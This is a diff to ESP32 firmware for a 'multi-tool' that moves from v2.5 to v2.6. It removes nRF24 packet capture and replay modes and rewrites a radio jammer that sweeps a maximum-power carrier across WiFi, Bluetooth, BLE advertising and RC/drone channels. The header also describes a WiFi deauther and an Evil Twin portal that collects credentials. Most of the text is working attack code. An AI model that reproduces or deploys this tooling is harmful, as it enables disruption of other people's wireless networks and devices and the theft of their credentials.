@@ -1,5 +1,5 @@
 // =============================================================
-// ESP32 MULTI-TOOL v2.5
+// ESP32 MULTI-TOOL v2.6
 // =============================================================
 // BUTTON (GPIO0 built-in BOOT):
 //   Single click  = scroll down / next / ch+
@@ -13,21 +13,21 @@
 //   Evil Twin, NRF Cap, NRF Replay → hold button to cycle and select
 //
 // BUTTON MAP PER MODE:
-//   Deauth   : 1=next  2=fire on/off  3=rescan
+//   Deauth   : 1=next AP  2=fire on/off  3=rescan
 //   EvilTwin : 1=next SSID  2=launch/stop  3=creds on OLED
-//   NRF Cap  : 1=ch+  2=ch-  3=clear buffer
-//   NRF Replay: 1=next pkt  2=replay  3=clear
-//   Jammer   : 1=ch+  2=sweep on/off  3=ch-
+//   Jammer   : 1=next target (or ch+ in CUSTOM)  2=start/stop
+//              triple always exits to idle
 //
 // EVIL TWIN CREDS:
 //   http://192.168.4.1/creds (user:admin pass:CREDS_PASSWORD)
 //   OR triple click while live → OLED viewer
 //
-// JAMMER NOTE:
-//   Uses nRF24 continuous carrier wave. Jams nRF24 devices,
-//   toy drones, RC cars, Zigbee, partially WiFi on same channel.
-//   Cannot jam BLE (hops too fast) or do wideband jamming.
-//   WiFi deauther handles WiFi disruption separately.
+// JAMMER TARGETS:
+//   WIFI      — sweeps nRF24 ch1-83  (2401-2483 MHz, all WiFi 2.4GHz)
+//   BLUETOOTH — sweeps nRF24 ch2-80  (2402-2480 MHz, BT classic)
+//   BLE       — rotates ch2/26/80    (BLE advertising channels)
+//   RC/DRONE  — sweeps nRF24 ch0-125 (full 2.4GHz, hits most RC/ESB)
+//   CUSTOM    — fixed manual channel, 1=ch+  2=start/stop
 // =============================================================
 
 #define CREDS_PASSWORD "changeme123"   // ← change before flashing
@@ -70,8 +70,6 @@ enum AppMode {
   MODE_IDLE = 0,
   MODE_DEAUTH,
   MODE_EVIL_TWIN,
-  MODE_NRF_CAPTURE,
-  MODE_NRF_REPLAY,
   MODE_JAMMER
 };
 AppMode currentMode = MODE_IDLE;
@@ -124,10 +122,9 @@ void updateBoot() {
 // =============================================================
 // MODE CYCLING (hold, no switches active)
 // =============================================================
-const char* cycleLabels[] = { "DEAUTHER","EVIL TWIN","NRF CAP","NRF PLAY","JAMMER" };
-AppMode     cycleModes[]  = { MODE_DEAUTH, MODE_EVIL_TWIN,
-                               MODE_NRF_CAPTURE, MODE_NRF_REPLAY, MODE_JAMMER };
-const int   NUM_CYCLE     = 5;
+const char* cycleLabels[] = { "DEAUTHER","EVIL TWIN","JAMMER" };
+AppMode     cycleModes[]  = { MODE_DEAUTH, MODE_EVIL_TWIN, MODE_JAMMER };
+const int   NUM_CYCLE     = 3;
 int         holdCycleIdx  = 0;
 unsigned long holdCycleLast = 0;
 
@@ -437,223 +434,155 @@ void handleEvilTwin() {
 }
 
 // =============================================================
-// nRF24 CAPTURE
-// 1=ch+  2=ch-  3=clear buffer
+// nRF24 SETUP (shared, used by jammer)
 // =============================================================
-#define MAX_PKTS 10
-uint8_t nrfPkts[MAX_PKTS][32];
-int  nrfCount=0, nrfScroll=0;
-uint8_t nrfChan=2;
-bool nrfCapOn=false, nrfReady=false;
-const uint64_t PROMISC_ADDR=0xAAAAAAAAAALL;
+bool nrfReady = false;
 
 void setupNRF() {
   if (!radio.begin()) return;
   radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
   radio.setAutoAck(false); radio.disableCRC(); radio.setPayloadSize(32);
-  nrfReady=true;
-}
-
-void nrfStartCap() {
-  radio.setChannel(nrfChan); radio.setAddressWidth(2);
-  radio.openReadingPipe(1,PROMISC_ADDR); radio.startListening();
-  nrfCapOn=true; digitalWrite(LED_BLUE,HIGH);
-}
-void nrfStopCap() { radio.stopListening(); nrfCapOn=false; digitalWrite(LED_BLUE,LOW); }
-
-void nrfPoll() {
-  if (!nrfCapOn||nrfCount>=MAX_PKTS) return;
-  if (radio.available()) {
-    radio.read(nrfPkts[nrfCount++],32);
-    digitalWrite(LED_YELLOW,HIGH); delay(40); digitalWrite(LED_YELLOW,LOW);
-  }
-}
-
-void drawNRFCap() {
-  oledClear();
-  oledHeader(nrfCapOn?"nRF24 CAP [ON]":"nRF24 CAP [OFF]");
-  display.setCursor(0,13); display.printf("Ch:%3d  Pkts: %d/%d",nrfChan,nrfCount,MAX_PKTS);
-  // WiFi channel reference (nRF ch ≈ 2400+ch MHz, WiFi ch1=2412)
-  int wifiCh=(nrfChan>=12)?(nrfChan-12)/5+1:-1;
-  if (wifiCh>=1&&wifiCh<=13) { display.setCursor(0,22); display.printf("~WiFi ch%d",wifiCh); }
-  if (nrfCount>0) {
-    display.setCursor(0,30); display.print("Last:");
-    display.setCursor(0,39); for(int i=0;i<8;i++) display.printf("%02X ",nrfPkts[nrfCount-1][i]);
-    display.setCursor(0,49); for(int i=8;i<16;i++) display.printf("%02X ",nrfPkts[nrfCount-1][i]);
-  } else { display.setCursor(0,35); display.print("Listening for packets..."); }
-  oledFooter("1:ch+ 2:ch- 3:clear");
-  display.display();
-}
-
-void handleNRFCapture() {
-  if (!nrfReady) {
-    oledClear(); oledHeader("nRF24 CAP");
-    display.setCursor(0,25); display.print("nRF24 not found!");
-    display.setCursor(0,37); display.print("Check wiring.");
-    display.display(); return;
-  }
-  if (evtSingle) { nrfChan=nrfChan>=125?0:nrfChan+1; if(nrfCapOn){nrfStopCap();nrfStartCap();} }
-  if (evtDouble) { nrfChan=nrfChan==0?125:nrfChan-1; if(nrfCapOn){nrfStopCap();nrfStartCap();} }
-  if (evtTriple) { nrfCount=0; nrfScroll=0; }
-  nrfPoll();
-  drawNRFCap();
+  nrfReady = true;
 }
 
 // =============================================================
-// nRF24 REPLAY
-// 1=next pkt  2=replay  3=clear buffer
-// =============================================================
-void nrfReplay(int idx) {
-  radio.stopListening(); radio.setAddressWidth(5);
-  radio.openWritingPipe(PROMISC_ADDR); radio.setChannel(nrfChan);
-  for (int i=0;i<5;i++) { radio.write(nrfPkts[idx],32); delay(8); }
-  if (nrfCapOn) radio.startListening();
-  digitalWrite(LED_RED,HIGH); delay(100); digitalWrite(LED_RED,LOW);
-}
-
-void drawNRFReplay() {
-  oledClear(); oledHeader("nRF24 REPLAY");
-  display.setCursor(0,13); display.printf("Ch:%3d  Pkts: %d",nrfChan,nrfCount);
-  if (nrfCount==0) {
-    display.setCursor(0,28); display.print("No packets captured.");
-    display.setCursor(0,40); display.print("Use CAP mode first.");
-  } else {
-    int idx=nrfScroll%nrfCount;
-    display.setCursor(0,24); display.printf("Pkt %d/%d:",idx+1,nrfCount);
-    display.setCursor(0,34); for(int i=0;i<8;i++) display.printf("%02X ",nrfPkts[idx][i]);
-    display.setCursor(0,44); for(int i=8;i<16;i++) display.printf("%02X ",nrfPkts[idx][i]);
-  }
-  oledFooter("1:next 2:REPLAY 3:clr");
-  display.display();
-}
-
-void handleNRFReplay() {
-  if (evtSingle&&nrfCount>0) nrfScroll=(nrfScroll+1)%nrfCount;
-  if (evtDouble&&nrfCount>0) nrfReplay(nrfScroll%nrfCount);
-  if (evtTriple) { nrfCount=0; nrfScroll=0; }
-  drawNRFReplay();
-}
-
-// =============================================================
-// nRF24 JAMMER
-// Broadcasts continuous carrier wave on a 2.4GHz channel.
-// Targets: nRF24 devices, RC toys, Zigbee, partially WiFi.
-// Does NOT jam BLE (hops too fast) or do wideband jamming.
+// nRF24 JAMMER — target-based
+// Selects a jam target then sweeps or fixes a carrier wave.
 //
-// 1=ch+  2=toggle sweep mode  3=ch-
-// Sweep: rapidly hops channels for broader interference.
-// Fixed: jams single channel at max power.
+// Jammer OFF:  1=next target   2=start
+// Jammer ON:   2=stop          1=ch+ (CUSTOM only)
+// Triple always exits to idle.
+//
+// TARGETS:
+//   WIFI      ch1-83   2401-2483 MHz  sweep 2ms/hop
+//   BLUETOOTH ch2-80   2402-2480 MHz  sweep 1ms/hop
+//   BLE       ch2/26/80 advert chans  rotates 1ms/hop
+//   RC/DRONE  ch0-125  full 2.4GHz    sweep 2ms/hop
+//   CUSTOM    fixed manual channel    1=ch+  2=jam
 // =============================================================
-bool     jamActive  = false;
-bool     jamSweep   = false;
-uint8_t  jamChan    = 40;   // default ch40 ≈ 2440MHz (WiFi ch8 overlap)
-unsigned long jamSweepLast = 0;
-uint8_t  jamSweepChan = 0;
+struct JamTarget { const char* name; const char* desc; uint8_t lo; uint8_t hi; uint8_t hopMs; };
+// lo==hi==0 means BLE special (3 fixed advertising channels)
+// hopMs==0  means CUSTOM (fixed channel, no sweep)
+const JamTarget JAM_TARGETS[] = {
+  { "WIFI",      "ch1-83  2401-2483MHz",   1,  83, 2 },
+  { "BLUETOOTH", "ch2-80  2402-2480MHz",   2,  80, 1 },
+  { "BLE",       "advert ch 2/26/80",       0,   0, 1 },
+  { "RC/DRONE",  "ch0-125 full 2.4GHz",    0, 125, 2 },
+  { "CUSTOM",    "manual channel",          0,   0, 0 },
+};
+const int NUM_JAM_TARGETS = 5;
+const uint8_t BLE_ADV_CHANS[3] = { 2, 26, 80 };
 
-// WiFi channel 1-13 maps to nRF24 channels:
-// WiFi ch N centre = 2407 + 5*N MHz → nRF24 ch = (WiFi_MHz - 2400)
-// e.g. WiFi ch1=2412MHz → nRF24 ch12
-// Sweep range covers nRF24 ch1..125 (2401..2525 MHz)
-// WiFi 2.4GHz sits in ch1..83
+int           jamTargetIdx  = 0;
+uint8_t       jamCustomChan = 40;
+bool          jamActive     = false;
+uint8_t       jamCurChan    = 0;
+int           jamBleIdx     = 0;
+unsigned long jamHopLast    = 0;
 
 void jamStart() {
   if (!nrfReady) return;
-  nrfStopCap(); // make sure cap mode is off
   radio.stopListening();
-  radio.startConstCarrier(RF24_PA_MAX, jamChan);
-  jamActive=true;
-  digitalWrite(LED_RED,HIGH);
+  const JamTarget& t = JAM_TARGETS[jamTargetIdx];
+  if (t.hopMs == 0) {
+    jamCurChan = jamCustomChan;
+  } else if (t.lo == 0 && t.hi == 0) {
+    jamBleIdx = 0; jamCurChan = BLE_ADV_CHANS[0];
+  } else {
+    jamCurChan = t.lo;
+  }
+  radio.startConstCarrier(RF24_PA_MAX, jamCurChan);
+  jamActive = true; jamHopLast = millis();
+  digitalWrite(LED_RED, HIGH);
 }
 
 void jamStop() {
   if (!nrfReady) return;
   radio.stopConstCarrier();
-  // re-init radio for normal use
   radio.begin();
   radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
   radio.setAutoAck(false); radio.disableCRC(); radio.setPayloadSize(32);
-  jamActive=false; jamSweep=false;
-  ledsOff();
+  jamActive = false; ledsOff();
 }
 
 void jamPoll() {
-  if (!jamActive||!jamSweep) return;
-  if (millis()-jamSweepLast>=2) { // hop every 2ms
-    jamSweepChan=(jamSweepChan+1)%126;
-    radio.stopConstCarrier();
-    radio.startConstCarrier(RF24_PA_MAX,jamSweepChan);
-    jamSweepLast=millis();
-    // blink yellow to show activity
-    digitalWrite(LED_YELLOW,(jamSweepChan%8)==0);
+  if (!jamActive) return;
+  const JamTarget& t = JAM_TARGETS[jamTargetIdx];
+  if (t.hopMs == 0) return;
+  if (millis() - jamHopLast < t.hopMs) return;
+  jamHopLast = millis();
+  if (t.lo == 0 && t.hi == 0) {
+    jamBleIdx = (jamBleIdx + 1) % 3;
+    jamCurChan = BLE_ADV_CHANS[jamBleIdx];
+  } else {
+    jamCurChan = (jamCurChan >= t.hi) ? t.lo : jamCurChan + 1;
   }
+  radio.stopConstCarrier();
+  radio.startConstCarrier(RF24_PA_MAX, jamCurChan);
+  if ((jamCurChan % 8) == 0) digitalWrite(LED_YELLOW, !digitalRead(LED_YELLOW));
 }
 
 void drawJammer() {
   oledClear();
+  const JamTarget& t = JAM_TARGETS[jamTargetIdx];
   char hdr[22];
-  if (!jamActive)    snprintf(hdr,22,"JAMMER [OFF]");
-  else if (jamSweep) snprintf(hdr,22,"JAMMER [SWEEP]");
-  else               snprintf(hdr,22,"JAMMER [FIXED ch%d]",jamChan);
+  if (jamActive) snprintf(hdr, 22, "JAM [%s]", t.name);
+  else           snprintf(hdr, 22, "JAMMER");
   oledHeader(hdr);
 
-  display.setCursor(0,13);
   if (!jamActive) {
-    display.printf("Channel: %3d",jamChan);
-    // show what this channel hits
-    int wc=(jamChan>=12)?(jamChan-12)/5+1:-1;
-    display.setCursor(0,23);
-    if (wc>=1&&wc<=13) display.printf("~WiFi ch%d / 2.4GHz",wc);
-    else               display.printf("2.4GHz band (%dMHz)",2400+jamChan);
-    display.setCursor(0,35); display.print("Targets: nRF24, RC,");
-    display.setCursor(0,45); display.print("Zigbee, partial WiFi");
-    display.setCursor(0,50); // overwrite footer area
-  } else if (jamSweep) {
-    display.printf("Sweeping ch 0-125");
-    display.setCursor(0,23); display.printf("Current: ch%3d",jamSweepChan);
-    display.setCursor(0,33); display.printf("Freq: %dMHz",2400+jamSweepChan);
-    display.setCursor(0,43); display.print("Broad interference!");
-    digitalWrite(LED_RED,HIGH);
+    display.setCursor(0, 13); display.printf("> %s", t.name);
+    display.setCursor(0, 23);
+    if (jamTargetIdx == 4) {
+      display.printf("  Ch:%3d (%dMHz)", jamCustomChan, 2400 + jamCustomChan);
+      display.setCursor(0, 33); display.print("  1:ch+  2:start jam");
+    } else {
+      display.print(t.desc);
+      display.setCursor(0, 33);
+      if (t.lo == 0 && t.hi == 0) display.printf("  rotates 3 advert ch");
+      else display.printf("  %d channels, sweep", t.hi - t.lo + 1);
+      display.setCursor(0, 43); display.print("  1:next  2:start jam");
+    }
   } else {
-    display.printf("Fixed ch%3d  (%dMHz)",jamChan,2400+jamChan);
-    int wc=(jamChan>=12)?(jamChan-12)/5+1:-1;
-    display.setCursor(0,23);
-    if (wc>=1&&wc<=13) display.printf("Jamming WiFi ch%d area",wc);
-    else               display.printf("Jamming 2.4GHz band");
-    display.setCursor(0,35); display.print("TX at MAX power");
-    display.setCursor(0,45); display.print("[ACTIVE]");
-    digitalWrite(LED_RED,!digitalRead(LED_RED)); // blink
+    display.setCursor(0, 13); display.printf("Target: %s", t.name);
+    display.setCursor(0, 23); display.printf("Chan: %3d  %dMHz", jamCurChan, 2400 + jamCurChan);
+    if (jamTargetIdx == 4) {
+      display.setCursor(0, 33); display.print("Fixed carrier [ON]");
+      display.setCursor(0, 43); display.print("1:ch+  2:stop");
+    } else {
+      display.setCursor(0, 33); display.print("Sweeping [ACTIVE]");
+      display.setCursor(0, 43); display.print("2:stop  3:exit");
+    }
+    digitalWrite(LED_RED, !digitalRead(LED_RED));
   }
-  oledFooter("1:ch+ 2:sweep 3:ch-");
   display.display();
 }
 
 void handleJammer() {
   if (!nrfReady) {
     oledClear(); oledHeader("JAMMER");
-    display.setCursor(0,25); display.print("nRF24 not found!");
-    display.setCursor(0,37); display.print("Check wiring.");
+    display.setCursor(0, 25); display.print("nRF24 not found!");
+    display.setCursor(0, 37); display.print("Check wiring.");
     display.display(); return;
   }
-
-  if (evtSingle) {
-    jamChan=jamChan>=125?0:jamChan+1;
-    if (jamActive&&!jamSweep) { radio.stopConstCarrier(); radio.startConstCarrier(RF24_PA_MAX,jamChan); }
-  }
-  if (evtTriple) {
-    jamChan=jamChan==0?125:jamChan-1;
-    if (jamActive&&!jamSweep) { radio.stopConstCarrier(); radio.startConstCarrier(RF24_PA_MAX,jamChan); }
-  }
-  if (evtDouble) {
-    if (!jamActive) {
-      jamSweep=false; jamStart();      // first double: start fixed
-    } else if (!jamSweep) {
-      jamSweep=true; jamSweepChan=0;  // second double: enable sweep
-      jamSweepLast=millis();
-    } else {
-      jamStop();                        // third double: stop everything
+  if (!jamActive) {
+    if (evtSingle) {
+      if (jamTargetIdx == 4) {
+        jamCustomChan = jamCustomChan >= 125 ? 0 : jamCustomChan + 1;
+      } else {
+        jamTargetIdx = (jamTargetIdx + 1) % NUM_JAM_TARGETS;
+      }
+    }
+    if (evtDouble) jamStart();
+  } else {
+    if (evtDouble) jamStop();
+    if (jamTargetIdx == 4 && evtSingle) {
+      jamCustomChan = jamCustomChan >= 125 ? 0 : jamCustomChan + 1;
+      jamCurChan = jamCustomChan;
+      radio.stopConstCarrier();
+      radio.startConstCarrier(RF24_PA_MAX, jamCurChan);
     }
   }
-
   jamPoll();
   drawJammer();
 }
@@ -663,18 +592,14 @@ void handleJammer() {
 // =============================================================
 void onModeEnter(AppMode mode) {
   ledsOff(); twinCredsView=false;
-  // Always stop jammer when leaving jammer mode
   if (jamActive) jamStop();
   switch (mode) {
     case MODE_IDLE:
       if (twinActive) stopTwin();
-      if (nrfCapOn)   nrfStopCap();
       deauthing=false; drawIdle(); break;
-    case MODE_DEAUTH:      initWifi(); apSelected=0; deauthing=false; startWifiScanAsync(); break;
-    case MODE_EVIL_TWIN:   credCount=0; twinScroll=0; SPIFFS.begin(true); break;
-    case MODE_NRF_CAPTURE: if(nrfReady){nrfCount=0;nrfScroll=0;nrfStartCap();} break;
-    case MODE_NRF_REPLAY:  nrfScroll=0; break;
-    case MODE_JAMMER:      jamChan=40; jamSweep=false; jamActive=false; break;
+    case MODE_DEAUTH:    initWifi(); apSelected=0; deauthing=false; startWifiScanAsync(); break;
+    case MODE_EVIL_TWIN: credCount=0; twinScroll=0; SPIFFS.begin(true); break;
+    case MODE_JAMMER:    jamTargetIdx=0; jamCustomChan=40; jamActive=false; break;
   }
 }
 
@@ -696,7 +621,7 @@ void setup() {
   display.setCursor(18,8);  display.print("MULTI");
   display.setCursor(14,28); display.print("-TOOL-");
   display.setTextSize(1);
-  display.setCursor(20,50); display.print("v2.5  ESP32+nRF24");
+  display.setCursor(20,50); display.print("v2.6  ESP32+nRF24");
   display.display();
 
   for (int i=0;i<3;i++) {
@@ -742,10 +667,8 @@ void loop() {
   switch (currentMode) {
     case MODE_IDLE:
       { static unsigned long li=0; if(millis()-li>500){drawIdle();li=millis();} break; }
-    case MODE_DEAUTH:      handleDeauth();     break;
-    case MODE_EVIL_TWIN:   handleEvilTwin();   break;
-    case MODE_NRF_CAPTURE: handleNRFCapture(); break;
-    case MODE_NRF_REPLAY:  handleNRFReplay();  break;
-    case MODE_JAMMER:      handleJammer();     break;
+    case MODE_DEAUTH:    handleDeauth();    break;
+    case MODE_EVIL_TWIN: handleEvilTwin(); break;
+    case MODE_JAMMER:    handleJammer();   break;
   }
 }
